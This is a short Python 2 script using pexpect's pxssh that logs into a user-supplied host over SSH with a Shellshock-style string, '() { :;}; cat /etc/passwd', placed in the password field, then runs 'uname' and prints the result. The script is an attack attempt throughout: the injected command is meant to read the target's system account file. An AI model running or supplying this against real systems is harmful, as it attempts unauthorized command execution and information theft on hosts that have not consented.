#!/usr/bin/python

from pexpect import pxssh
import getpass
try:
    s = pxssh.pxssh()
    hostname = raw_input('hostname: ')
    username = raw_input('username: ')
    password = '() { :;}; cat /etc/passwd'
    s.login (hostname, username, password)
    s.sendline ('uname')   # run a command
    s.prompt()             # match the prompt
    print s.before          # print everything before the prompt.
    s.logout()
except pxssh.ExceptionPxssh, e:
    print "pxssh failed on login."
    print str(e)





